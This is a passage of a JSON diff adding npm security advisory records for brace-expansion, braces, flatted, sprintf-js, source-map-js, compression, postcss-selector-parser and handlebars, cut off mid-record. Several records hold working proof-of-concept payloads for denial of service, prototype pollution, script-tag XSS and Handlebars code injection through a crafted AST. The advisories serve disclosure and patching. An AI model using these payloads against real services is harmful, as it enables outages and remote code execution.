+      "overview": "### Summary\n\n`parseCommaParts()` can exhaust the native stack and crash the process. There are two distinct ways to trigger it, both reachable from a single untrusted pattern string.\n\nThis is the parsing-side counterpart to CVE-2026-14257 / GHSA-mh99-v99m-4gvg. That fix made `expand_()` iterative and documented a constant-stack-depth guarantee, but `parseCommaParts()` was left recursive, so the guarantee only held for one of the two parsing paths.\n\n### Vector 1 - unbounded recursion on `post`\n\n`parseCommaParts()` recursed on the remainder of the string once per brace group:\n\n```js\nconst postParts = parseCommaParts(post)   // unbounded\n```\n\nA brace group containing many comma-separated groups drives one recursion level per group:\n\n```js\nexpand('{' + '{a},'.repeat(7000) + 'b}')\n// RangeError: Maximum call stack size exceeded\n```\n\nAbout 7,300 repetitions - roughly 29 KB of input - is enough on Node 24; roughly 6,300 (25 KB) on Node 18. The threshold is identical on every affected release line.\n\n### Vector 2 - `push.apply` with an unbounded array\n\nEven with the recursion removed, `parseCommaParts()` spread whole arrays into an argument list:\n\n```js\np.push.apply(p, postParts)\nparts.push.apply(parts, p)\n```\n\n`Function.prototype.apply` places one argument per element on the stack, so a single large array overflows it. This needs **no recursion depth at all** - the following reaches a recursion depth of exactly 1:\n\n```js\nexpand('{{x},' + 'a,'.repeat(125000) + 'b}')\n// RangeError: Maximum call stack size exceeded\n```\n\nThreshold is about 124,300 repetitions (~249 KB). This vector was not part of the original report; it was found while verifying the fix. A patch that only de-recurses but keeps `push.apply` leaves a working denial of service behind.\n\n### Why `max` and `maxLength` do not help\n\nBoth crashes happen during **parsing**, before any expansion. The payloads produce one result per group, so output size grows linearly with input and is never the limiter. `expand(payload, { max: 1, maxLength: 1 })` still overflows.\n\n### Impact\n\nAny application that passes an untrusted string to `expand()` - directly, or through `minimatch` / `glob` where it is a user-supplied glob pattern - can be crashed. In Node, a `RangeError` that the application does not catch terminates the process, so a server that globs user input is exposed to remote unauthenticated denial of service.\n\n`minimatch`'s own `MAX_PATTERN_LENGTH` cap (65,536) does not help against vector 1: the overflow threshold sits well below it. Confirmed on minimatch 10.2.6 - a 64,003-byte pattern passes the length check and overflows both `minimatch.braceExpand()` and `new minimatch.Minimatch()`.\n\nThis is an availability-only issue. No code execution and no data exposure.\n\n### Not a regression\n\n5.0.8 and 5.0.9 overflow at the same repetition count, so the gap predates the recent advisories; those fixes simply did not reach it. Verified affected on 1.1.18, 2.1.4, 3.0.6, 5.0.8 and 5.0.9, all at an identical threshold.\n\n### Patch\n\n`parseCommaParts()` is rewritten as a loop that carries the partial part across chunks, and every array append uses an element-by-element loop rather than `push.apply`. The redundant `if (!str) return ['']` guard is dropped - the loop returns `['']` for the empty string on its own.\n\nEquivalence of the old and new implementations was checked by differential testing: exhaustive over every string of `{`, `}`, `,`, `a` up to length 7 plus 300,000 random inputs - 322,000 cases, zero mismatches.\n\n### Severity note\n\nScored 7.5 High under CVSS 3.1 for consistency with the other availability advisories on this package (GHSA-mh99-v99m-4gvg, GHSA-rgw5-rvv9-x895), which use the same vector. The reporter self-assessed 6.9 Medium under CVSS 4.0 (`CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N`).\n\n### Credit\n\nReported by baeseungwon1010, with a working proof of concept and a proposed patch. Vector 2 was identified during maintainer verification.",
+      "reported_by": null,
+      "title": "brace-expansion: DoS via uncontrolled recursion in parseCommaParts causing stack exhaustion",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-102276"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "brace-expansion",
+      "vulnerable_versions": "<1.1.19",
+      "github_advisory_id": "GHSA-6j4f-fj2g-mc7p",
+      "recommendation": "Upgrade to version 1.1.19 or later",
+      "patched_versions": ">=1.1.19",
+      "updated": "2026-09-29T23:44:59.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-674"
+      ],
+      "url": "https://github.com/advisories/GHSA-6j4f-fj2g-mc7p"
+    },
+    "1240109": {
+      "findings": [
+        {
+          "version": "2.0.2",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/juliangruber/brace-expansion/security/advisories/GHSA-6j4f-fj2g-mc7p\n- https://nvd.nist.gov/vuln/detail/CVE-2026-102276\n- https://github.com/juliangruber/brace-expansion/commit/0bcbfc0a5928c3073d48f42999d1ce4fc1c42fbc\n- https://github.com/juliangruber/brace-expansion/commit/316359e6019c39b3254c8ba8e25dc586a480652c\n- https://github.com/juliangruber/brace-expansion/commit/5171e681c0922b7ae8bfaf9a331e309107be6edc\n- https://github.com/juliangruber/brace-expansion/commit/6735c94873ca570bcdd6a0690033bdd3126379d3\n- https://github.com/advisories/GHSA-6j4f-fj2g-mc7p",
+      "created": "2026-09-29T23:44:58.000Z",
+      "id": 1240109,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\n`parseCommaParts()` can exhaust the native stack and crash the process. There are two distinct ways to trigger it, both reachable from a single untrusted pattern string.\n\nThis is the parsing-side counterpart to CVE-2026-14257 / GHSA-mh99-v99m-4gvg. That fix made `expand_()` iterative and documented a constant-stack-depth guarantee, but `parseCommaParts()` was left recursive, so the guarantee only held for one of the two parsing paths.\n\n### Vector 1 - unbounded recursion on `post`\n\n`parseCommaParts()` recursed on the remainder of the string once per brace group:\n\n```js\nconst postParts = parseCommaParts(post)   // unbounded\n```\n\nA brace group containing many comma-separated groups drives one recursion level per group:\n\n```js\nexpand('{' + '{a},'.repeat(7000) + 'b}')\n// RangeError: Maximum call stack size exceeded\n```\n\nAbout 7,300 repetitions - roughly 29 KB of input - is enough on Node 24; roughly 6,300 (25 KB) on Node 18. The threshold is identical on every affected release line.\n\n### Vector 2 - `push.apply` with an unbounded array\n\nEven with the recursion removed, `parseCommaParts()` spread whole arrays into an argument list:\n\n```js\np.push.apply(p, postParts)\nparts.push.apply(parts, p)\n```\n\n`Function.prototype.apply` places one argument per element on the stack, so a single large array overflows it. This needs **no recursion depth at all** - the following reaches a recursion depth of exactly 1:\n\n```js\nexpand('{{x},' + 'a,'.repeat(125000) + 'b}')\n// RangeError: Maximum call stack size exceeded\n```\n\nThreshold is about 124,300 repetitions (~249 KB). This vector was not part of the original report; it was found while verifying the fix. A patch that only de-recurses but keeps `push.apply` leaves a working denial of service behind.\n\n### Why `max` and `maxLength` do not help\n\nBoth crashes happen during **parsing**, before any expansion. The payloads produce one result per group, so output size grows linearly with input and is never the limiter. `expand(payload, { max: 1, maxLength: 1 })` still overflows.\n\n### Impact\n\nAny application that passes an untrusted string to `expand()` - directly, or through `minimatch` / `glob` where it is a user-supplied glob pattern - can be crashed. In Node, a `RangeError` that the application does not catch terminates the process, so a server that globs user input is exposed to remote unauthenticated denial of service.\n\n`minimatch`'s own `MAX_PATTERN_LENGTH` cap (65,536) does not help against vector 1: the overflow threshold sits well below it. Confirmed on minimatch 10.2.6 - a 64,003-byte pattern passes the length check and overflows both `minimatch.braceExpand()` and `new minimatch.Minimatch()`.\n\nThis is an availability-only issue. No code execution and no data exposure.\n\n### Not a regression\n\n5.0.8 and 5.0.9 overflow at the same repetition count, so the gap predates the recent advisories; those fixes simply did not reach it. Verified affected on 1.1.18, 2.1.4, 3.0.6, 5.0.8 and 5.0.9, all at an identical threshold.\n\n### Patch\n\n`parseCommaParts()` is rewritten as a loop that carries the partial part across chunks, and every array append uses an element-by-element loop rather than `push.apply`. The redundant `if (!str) return ['']` guard is dropped - the loop returns `['']` for the empty string on its own.\n\nEquivalence of the old and new implementations was checked by differential testing: exhaustive over every string of `{`, `}`, `,`, `a` up to length 7 plus 300,000 random inputs - 322,000 cases, zero mismatches.\n\n### Severity note\n\nScored 7.5 High under CVSS 3.1 for consistency with the other availability advisories on this package (GHSA-mh99-v99m-4gvg, GHSA-rgw5-rvv9-x895), which use the same vector. The reporter self-assessed 6.9 Medium under CVSS 4.0 (`CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N`).\n\n### Credit\n\nReported by baeseungwon1010, with a working proof of concept and a proposed patch. Vector 2 was identified during maintainer verification.",
+      "reported_by": null,
+      "title": "brace-expansion: DoS via uncontrolled recursion in parseCommaParts causing stack exhaustion",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-102276"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "brace-expansion",
+      "vulnerable_versions": ">=2.0.0 <2.1.5",
+      "github_advisory_id": "GHSA-6j4f-fj2g-mc7p",
+      "recommendation": "Upgrade to version 2.1.5 or later",
+      "patched_versions": ">=2.1.5",
+      "updated": "2026-09-29T23:44:59.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-674"
+      ],
+      "url": "https://github.com/advisories/GHSA-6j4f-fj2g-mc7p"
+    },
+    "1240992": {
+      "findings": [
+        {
+          "version": "3.0.3",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2026-93687\n- https://github.com/micromatch/braces/issues/70\n- https://github.com/micromatch/braces/blob/3.0.3/lib/compile.js#L49-L53\n- https://github.com/micromatch/braces/blob/3.0.3/lib/expand.js#L102-L105\n- https://github.com/micromatch/braces/blob/3.0.3/lib/parse.js#L38-L40\n- https://www.vulncheck.com/advisories/braces-through-3.0.3-stack-overflow-via-deeply-nested-patterns\n- https://github.com/advisories/GHSA-vfj7-8cjw-p6xm",
+      "created": "2026-09-18T18:31:41.000Z",
+      "id": 1240992,
+      "npm_advisory_id": null,
+      "overview": "braces through 3.0.3 contains a stack overflow vulnerability in the recursive AST walkers that lack depth guards. Attackers can supply deeply nested brace patterns under the character limit to exhaust the call stack and terminate the Node.js process with an uncaught RangeError.",
+      "reported_by": null,
+      "title": "braces vulnerable to stack-exhaustion denial of service through deeply nested patterns",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-93687"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "braces",
+      "vulnerable_versions": "<=3.0.3",
+      "github_advisory_id": "GHSA-vfj7-8cjw-p6xm",
+      "recommendation": "None",
+      "patched_versions": "<0.0.0",
+      "updated": "2026-10-02T22:36:34.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-674"
+      ],
+      "url": "https://github.com/advisories/GHSA-vfj7-8cjw-p6xm"
+    },
+    "1241196": {
+      "findings": [
+        {
+          "version": "3.3.3",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/WebReflection/flatted/security/advisories/GHSA-rf6f-7fwh-wjgh\n- https://nvd.nist.gov/vuln/detail/CVE-2026-33228\n- https://github.com/WebReflection/flatted/commit/885ddcc33cf9657caf38c57c7be45ae1c5272802\n- https://github.com/WebReflection/flatted/releases/tag/v3.4.2\n- https://access.redhat.com/errata/RHSA-2026:13826\n- https://access.redhat.com/errata/RHSA-2026:34342\n- https://access.redhat.com/errata/RHSA-2026:9742\n- https://access.redhat.com/security/cve/CVE-2026-33228\n- https://bugzilla.redhat.com/show_bug.cgi?id=2449872\n- https://github.com/advisories/GHSA-rf6f-7fwh-wjgh",
+      "created": "2026-03-19T17:43:54.000Z",
+      "id": 1241196,
+      "npm_advisory_id": null,
+      "overview": "---\n  **Summary**\n\n  The parse() function in flatted can use attacker-controlled string values from the parsed JSON as direct array index\n  keys, without validating that they are numeric. Since the internal input buffer is a JavaScript Array, accessing it\n  with the key \"\\_\\_proto\\_\\_\" returns Array.prototype via the inherited getter. This object is then treated as a legitimate\n   parsed value and assigned as a property of the output object, effectively leaking a live reference to Array.prototype\n   to the consumer. Any code that subsequently writes to that property will pollute the global prototype.\n\n  ---\n  **Root Cause**\n\n  File: esm/index.js:29 (identical in cjs/index.js)\n```\n  const resolver = (input, lazy, parsed, $) => output => {\n    for (let ke = keys(output), {length} = ke, y = 0; y < length; y++) {\n      const k = ke[y];\n      const value = output[k];    \n      if (value instanceof Primitive) {\n        const tmp = input[value];      // Bug is here\n```\n\nNo validation that value is a safe numeric index input is built as a plain Array. JavaScript's property lookup on arrays traverses the prototype chain for non-numeric  keys. The key \"\\_\\_proto\\_\\_\" resolves to Array.prototype, which:\n\n  - has type \"object\" → passes the typeof tmp === object guard at line 30\n  - is not in the parsed Set yet → passes the !parsed.has(tmp) guard.\n  - The reference to Array.prototype is then enqueued in lazy and later unconditionally assigned to the output object.\n  ---\n  **Replication Steps**\n```\n  const Flatted = require('flatted'); \n  const parsed = Flatted.parse('[{\"x\":\"__proto__\"}]');\n  parsed.x.polluted = 'pwned';\n  console.log([].polluted);  // Returns true\n``` \n ---\n  **Impact**\n An attacker can supply a crafted flatted string to parse() that causes the returned object to hold a live reference to Array.prototype, enabling any downstream code that writes to that property to pollute the global prototype chain, potentially causing denial of service or code execution.\n\n  **Recommended solution**\n Validate that the index string represents an integer within the bounds of input before accessing it:\n\n  // Before (vulnerable)\n  const tmp = input[value];\n\n  // After (safe)\n  const idx = +value;  // coerce boxed String → number\n  const tmp = (Number.isInteger(idx) && idx >= 0 && idx < input.length)\n    ? input[idx]\n    : undefined;",
+      "reported_by": null,
+      "title": "Prototype Pollution via parse() in NodeJS flatted",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-33228"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "flatted",
+      "vulnerable_versions": "<=3.4.1",
+      "github_advisory_id": "GHSA-rf6f-7fwh-wjgh",
+      "recommendation": "Upgrade to version 3.4.2 or later",
+      "patched_versions": ">=3.4.2",
+      "updated": "2026-10-05T15:48:47.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-915",
+        "CWE-1321"
+      ],
+      "url": "https://github.com/advisories/GHSA-rf6f-7fwh-wjgh"
+    },
+    "1241202": {
+      "findings": [
+        {
+          "version": "1.0.3",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2026-97058\n- https://github.com/alexei/sprintf.js/issues/237\n- https://github.com/alexei/sprintf.js/blob/3a0d8c26d291b5bd9f1974877ecc50739921d6f5/src/sprintf.js#L17\n- https://github.com/alexei/sprintf.js/blob/3a0d8c26d291b5bd9f1974877ecc50739921d6f5/src/sprintf.js#L84-L90\n- https://www.vulncheck.com/advisories/sprintf-js-through-1.1.3-denial-of-service-via-unbounded-precision\n- https://github.com/advisories/GHSA-hp3w-g68c-fv3c",
+      "created": "2026-09-24T15:31:31.000Z",
+      "id": 1241202,
+      "npm_advisory_id": null,
+      "overview": "sprintf-js through 1.1.3 passes unbounded precision specifiers to toFixed, toExponential, and toPrecision methods without validation, causing uncaught RangeError exceptions. Attackers who control format strings can inject precision values exceeding ECMAScript limits to abort calling operations with minimal payload.",
+      "reported_by": null,
+      "title": "sprintf-js vulnerable to denial of service through unbounded precision specifiers",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-97058"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "sprintf-js",
+      "vulnerable_versions": "<=1.1.3",
+      "github_advisory_id": "GHSA-hp3w-g68c-fv3c",
+      "recommendation": "None",
+      "patched_versions": "<0.0.0",
+      "updated": "2026-10-05T23:47:35.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-1284"
+      ],
+      "url": "https://github.com/advisories/GHSA-hp3w-g68c-fv3c"
+    },
+    "1241209": {
+      "findings": [
+        {
+          "version": "1.2.1",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2026-93749\n- https://github.com/7rulnik/source-map-js/issues/76\n- https://github.com/7rulnik/source-map-js\n- https://github.com/7rulnik/source-map-js/blob/c1cd8904bb7bd0c7fb5879fcda48134d82a27934/lib/source-node.js#L115-L118\n- https://www.vulncheck.com/advisories/source-map-js-through-1.2.1-event-loop-denial-of-service\n- https://github.com/7rulnik/source-map-js/pull/79\n- https://github.com/7rulnik/source-map-js/commit/cf7658058ceeaa8619d5ae0ec90be6905209d016\n- https://github.com/7rulnik/source-map-js/releases/tag/v1.2.2\n- https://github.com/advisories/GHSA-68fv-2mgg-jv7q",
+      "created": "2026-09-18T18:31:44.000Z",
+      "id": 1241209,
+      "npm_advisory_id": null,
+      "overview": "source-map-js through 1.2.1 fails to validate the per-section offset line value in indexed source maps, allowing attackers to specify arbitrary numeric values. Attackers can supply extremely large offset line values that cause synchronous event loop blocking for extended periods, preventing the service from handling other requests.",
+      "reported_by": null,
+      "title": "source-map-js allows event-loop denial of service through indexed source-map section offsets",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-93749"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "source-map-js",
+      "vulnerable_versions": ">=1.0.0 <1.2.2",
+      "github_advisory_id": "GHSA-68fv-2mgg-jv7q",
+      "recommendation": "Upgrade to version 1.2.2 or later",
+      "patched_versions": ">=1.2.2",
+      "updated": "2026-10-05T23:31:22.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-1284"
+      ],
+      "url": "https://github.com/advisories/GHSA-68fv-2mgg-jv7q"
+    },
+    "1241221": {
+      "findings": [
+        {
+          "version": "1.8.1",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/expressjs/compression/security/advisories/GHSA-vc2v-76pw-4v95\n- https://nvd.nist.gov/vuln/detail/CVE-2026-87776\n- https://github.com/expressjs/compression/commit/151f63e91e1b64f8fb0b064e19321a4f28db6bff\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/expressjs/compression/releases/tag/v1.8.2\n- https://github.com/advisories/GHSA-vc2v-76pw-4v95",
+      "created": "2026-10-05T23:28:01.000Z",
+      "id": 1241221,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nA vulnerability in compression `< 1.8.2` allows an attacker to trigger a Denial of Service (DoS) by disconnecting while a compressed response is being sent. When the client aborts the connection before the response finishes, the zlib stream created to compress that response is never destroyed, so each aborted compressed response leaks its native zlib memory. Repeated aborted requests can exhaust available memory. All applications using compression are affected.\n\n### Patches\n\nUsers should upgrade to `1.8.2`.\n\n### Workarounds\n\nNone.",
+      "reported_by": null,
+      "title": "compression vulnerable to Denial of Service via memory leak on premature response close",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-87776"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "compression",
+      "vulnerable_versions": "<1.8.2",
+      "github_advisory_id": "GHSA-vc2v-76pw-4v95",
+      "recommendation": "Upgrade to version 1.8.2 or later",
+      "patched_versions": ">=1.8.2",
+      "updated": "2026-10-05T23:28:02.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-401",
+        "CWE-459"
+      ],
+      "url": "https://github.com/advisories/GHSA-vc2v-76pw-4v95"
+    },
+    "1241232": {
+      "findings": [
+        {
+          "version": "6.1.2",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/postcss/postcss-selector-parser/security/advisories/GHSA-rj75-hqrm-r3gf\n- https://nvd.nist.gov/vuln/detail/CVE-2026-104844\n- https://github.com/postcss/postcss-selector-parser/commit/62b191792df0a0bc56062e5a875bc74aae2a51cd\n- https://github.com/postcss/postcss-selector-parser/releases/tag/7.1.6\n- https://github.com/advisories/GHSA-rj75-hqrm-r3gf",
+      "created": "2026-10-05T22:53:54.000Z",
+      "id": 1241232,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\n`.` and `#` are not word delimiters in the tokenizer, so a flat selector such as\n`.a.a.a...` reaches `splitWord()` as a single word token carrying n class or id\nindexes. Three passes scanned those index arrays linearly for every index,\nmaking the parse O(n^2) in the number of indexes rather than in input length:\n`uniqs()`, the `indices.forEach` loop, and the Sass-interpolation filter.\nParsing a 400 KB flat selector took ~34 s on a modern laptop, fully occupying a\nsingle thread. A benign selector of identical byte size parses in tens of\nmilliseconds, so the cost is driven by the index count, not the input size.\nThe nesting depth of such a selector is 0, so the `maxNestingDepth` guard added\nin 7.1.3 offers no protection.\n\nReachability is deployment dependent. Only consumers that parse untrusted,\nattacker-supplied selectors synchronously in a request path are exposed, for\nexample CSS sanitizers, CSS-in-JS services and online playgrounds. Ordinary\nbuild-time use on trusted sources is not affected.\n\n### Patches\n\nFixed in 7.1.6. The three passes now use Set membership tests, making parsing\nlinear in the number of indexes. There is no behaviour change: parsing is\nbyte-identical on a differential corpus of 8413 selectors.\n\n### Workarounds\n\nCap the size of selectors accepted from untrusted sources before parsing.",
+      "reported_by": null,
+      "title": "PostCSS: Quadratic complexity in flat selector parsing allows CPU exhaustion",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-104844"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "postcss-selector-parser",
+      "vulnerable_versions": "<7.1.6",
+      "github_advisory_id": "GHSA-rj75-hqrm-r3gf",
+      "recommendation": "Upgrade to version 7.1.6 or later",
+      "patched_versions": ">=7.1.6",
+      "updated": "2026-10-05T22:53:57.000Z",
+      "cvss": {
+        "score": 5.9,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-407"
+      ],
+      "url": "https://github.com/advisories/GHSA-rj75-hqrm-r3gf"
+    },
+    "1241676": {
+      "findings": [
+        {
+          "version": "4.7.8",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/handlebars-lang/handlebars.js/security/advisories/GHSA-xw65-4hp5-5hc7\n- https://nvd.nist.gov/vuln/detail/CVE-2026-106444\n- https://github.com/handlebars-lang/handlebars.js/pull/2185\n- https://github.com/handlebars-lang/handlebars.js/commit/609d1b11c833c9a3e00f56f2f34d22f425446725\n- https://github.com/handlebars-lang/handlebars.js/releases/tag/v4.7.10\n- https://github.com/advisories/GHSA-xw65-4hp5-5hc7",
+      "created": "2026-10-08T17:52:37.000Z",
+      "id": 1241676,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\n`Handlebars.precompile()` generates JavaScript source that is commonly embedded in browser `<script>` elements. Before the fix, static template text containing `</script>` was emitted unchanged. HTML parsers recognize `</script>` even inside a JavaScript string literal, closing the surrounding script element and allowing following attacker-controlled markup to be parsed and executed.\n\nThis affects applications that precompile attacker-controlled templates and embed the generated source directly in an HTML `<script>` element. It does not affect ordinary server-side rendering or precompiled templates delivered as external JavaScript files.\n\n## Details\n\nStatic text is serialized by `quotedString()` in `lib/handlebars/compiler/code-gen.js`. The generated JavaScript is valid, but JavaScript quoting alone does not make it safe to embed in HTML. In HTML script data, the sequence `</script>` terminates the element regardless of JavaScript string context.\n\nOn affected releases, this template:\n\n```handlebars\nsafe</script><script>alert(\"XSS\")</script><script>\n```\n\ncould produce generated source containing:\n\n```js\nreturn 'safe</script><script>alert(\"XSS\")</script><script>';\n```\n\nWhen included inline in an HTML document, the first `</script>` closes the script containing the precompiled template. The next `<script>` element is then parsed as HTML and executes.\n\n## Proof of Concept\n\n```js\nconst Handlebars = require('handlebars');\n\nconst template = 'safe</script><script>alert(\"XSS\")</script><script>';\nconst output = Handlebars.precompile(template);\n\nconsole.log(output.includes('</script>'));\n```\n\nAffected versions print `true`. Embedding `output` directly in an inline `<script>` element allows the injected script tag to be parsed by the browser.\n\n## Workarounds\n\n- Do not inline precompiled output from untrusted templates into HTML documents.\n- Serve generated precompiled templates as external JavaScript files where practical.\n\n## Credits\n\nReported by Curly-Haired-Baboon Aka Laplas",
+      "reported_by": null,
+      "title": "Handlebars: JavaScript Injection via Unsafe Inline Embedding of Precompiled Templates",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-106444"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "handlebars",
+      "vulnerable_versions": ">=4.0.0 <=4.7.9",
+      "github_advisory_id": "GHSA-xw65-4hp5-5hc7",
+      "recommendation": "Upgrade to version 4.7.10 or later",
+      "patched_versions": ">=4.7.10",
+      "updated": "2026-10-08T17:52:39.000Z",
+      "cvss": {
+        "score": 4.7,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-116"
+      ],
+      "url": "https://github.com/advisories/GHSA-xw65-4hp5-5hc7"
+    },
+    "1241677": {
+      "findings": [
+        {
+          "version": "4.7.8",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/handlebars-lang/handlebars.js/security/advisories/GHSA-8r5x-fm3f-whwj\n- https://nvd.nist.gov/vuln/detail/CVE-2026-106446\n- https://github.com/handlebars-lang/handlebars.js/pull/2185\n- https://github.com/handlebars-lang/handlebars.js/commit/703fdcc5fd6cc8d1cc0c33cc19de40c467c4b8d2\n- https://github.com/handlebars-lang/handlebars.js/releases/tag/v4.7.10\n- https://github.com/advisories/GHSA-8r5x-fm3f-whwj",
+      "created": "2026-10-08T17:52:32.000Z",
+      "id": 1241677,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\n`Handlebars.compile()` and `Handlebars.precompile()` accept a pre-parsed AST as well as a template string. Handlebars 4.7.9 added validation for such ASTs. It only checks values on `PathExpression`, `NumberLiteral` and `BooleanLiteral` nodes, and the compiler still writes several other AST values into the generated JavaScript unchecked.\n\nIf an application passes an untrusted object to `compile()` or `precompile()`, such as a parsed JSON request body, that object can carry arbitrary JavaScript. With `compile()`, the code runs on the server when the template renders. With `precompile()`, it ends up in the precompiled output and runs wherever that output is loaded.\n\nApplications that only ever pass template **strings** are not affected.\n\nThis bypasses the AST validation added in 4.7.9 for GHSA-2w6w-674q-4c4q, GHSA-xhpv-hc6g-r9c6 and GHSA-3mfm-83xf-c92r.\n\n## Details\n\nThe 4.7.9 validator runs in `parseWithoutProcessing()` and walks the whole AST. It only checks values on nodes whose `type` is `PathExpression`, `NumberLiteral` or `BooleanLiteral`. It passes over plain objects without a `type`, and over strings and other non-object values. The compiler reads these values from other places and writes them into the generated code as-is:\n\n| AST value | Written into generated code as | Compile options needed |\n| --- | --- | --- |\n| `Program.blockParams.length` | `container.program(<index>, data, <length>)` | none (default options) |\n| `depth` on a param that is not a `PathExpression`, e.g. a `StringLiteral` | `depths[<depth>]` | `stringParams: true` |\n| A `StringLiteral.value` that is not a string | raw JavaScript literal | `stringParams: true` |\n| A `PathExpression.original` that is not a string | raw JavaScript literal | `stringParams: true` |\n\nThe first row works with default options. A `Program` with `blockParams: { \"length\": \"<JS expression>\" }` passes validation because:\n\n1. the `blockParams` object has no `type`, so none of the type-specific checks apply, and\n2. the walker skips the string under `length` because it is not an object.\n\nThe compiler then reads `program.blockParams.length` and writes the string directly into the template function. The `container.program(...)` call is part of the helper options object, which is built before the helper is looked up. The code therefore runs on render even if the block's helper does not exist.\n\n## Proof of Concept\n\n1. Start a server that compiles request input:\n\n```js\nimport express from \"express\";\nimport Handlebars from \"handlebars\";\n\nconst app = express();\napp.use(express.json());\n\napp.post(\"/api/render\", (req, res) => {\n  const template = Handlebars.compile(req.body.text); // `text` may be an object, not a string\n  res.send(template());\n});\n\napp.listen(2123);\n```\n\n2. Save this request body as `poc.json`. `missingHelper` does not need to exist:\n\n```json\n{\n  \"text\": {\n    \"type\": \"Program\",\n    \"loc\": { \"start\": { \"line\": 1, \"column\": 0 } },\n    \"body\": [\n      {\n        \"type\": \"BlockStatement\",\n        \"path\": {\n          \"type\": \"PathExpression\", \"data\": false, \"depth\": 0,\n          \"parts\": [\"missingHelper\"], \"original\": \"missingHelper\",\n          \"loc\": { \"start\": { \"line\": 1, \"column\": 0 } }\n        },\n        \"params\": [],\n        \"program\": {\n          \"type\": \"Program\",\n          \"blockParams\": {\n            \"length\": \"(()=>{throw new Error('Injected code ran as uid ' + process.getuid())})()\"\n          },\n          \"body\": [],\n          \"loc\": { \"start\": { \"line\": 1, \"column\": 0 } }\n        },\n        \"openStrip\": { \"open\": false, \"close\": false },\n        \"inverseStrip\": { \"open\": false, \"close\": false },\n        \"closeStrip\": { \"open\": false, \"close\": false },\n        \"loc\": { \"start\": { \"line\": 1, \"column\": 0 } }\n      }\n    ]\n  }\n}\n```\n\n3. Send the request:\n\n```sh\ncurl -s -X POST 'http://127.0.0.1:2123/api/render' \\\n     -H 'Content-Type: application/json' --data-binary @poc.json\n```\n\nThe server responds with HTTP 500 and an error page showing the injected code ran inside the Node.js process:\n\n```\nError: Injected code ran as uid 1000\n```\n\n## Impact\n\nAn application is affected if untrusted input can reach `Handlebars.compile()` or `Handlebars.precompile()` as an object instead of a string. A common way this happens is passing a field from a JSON request body straight to `compile()`.\n\n- **`compile()`**: arbitrary JavaScript runs in the Node.js process with the application's privileges (remote code execution).\n- **`precompile()`**: the injected code is written into the precompiled template and runs wherever that template is loaded, for example in users' browsers.\n\n\n## Workarounds\n\n- **Validate input type** before calling `Handlebars.compile()`: ensure the argument is always a  `string`, 